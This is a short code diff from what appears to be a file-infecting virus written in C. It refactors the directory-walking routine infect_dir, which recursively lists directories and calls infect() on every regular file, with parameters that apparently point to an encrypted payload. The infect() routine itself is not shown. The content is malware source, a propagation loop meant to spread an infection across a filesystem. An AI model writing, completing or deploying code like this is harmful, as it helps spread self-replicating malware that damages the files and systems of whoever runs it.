@@ -1,17 +1,17 @@
 #include "infect.h"
 
-int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
+int infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt){
 	//print("infecting directory:");
 	//println(dirname);
 	struct linux_dirent *d;
-	char		p[4096];
+	char		buf[4096];
 	int		fd;
 
 	debug("infect.dir: ", dirname);
 	if ((fd = ft_open(dirname, 65536, 0)) < 0) return fail("open dir");
 	while (1)
 	{
-		int size = getdents(fd, p, sizeof(p));
+		int size = getdents(fd, buf, sizeof(buf));
 		if (size == 0)
 			break;
 		if (size < 0)
@@ -21,12 +21,12 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 		}
 		size_t x;
 		for (x = 0; x < (size_t)size; x += d->d_reclen){
-			d = (struct linux_dirent*)(p + x);
+			d = (struct linux_dirent*)(buf + x);
 			if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
 				char *t = ft_add_base(dirname, d->d_name);
 				if (t == NULL)
 					continue;
-				infect_dir(t, b,bn,crypt_off,crypt_len,opt);
+				infect_dir(t,p,opt);
 				ft_free(t);
 			}
 			else if (d_isfile(d)){
@@ -34,7 +34,7 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 				debug("infect.file: ", t);
 				if (t == NULL)
 					continue;
-				infect(t, t, b, bn, crypt_off, crypt_len, opt);
+				infect(t, t, p, opt);
 				ft_free(t);
 			}
 		}
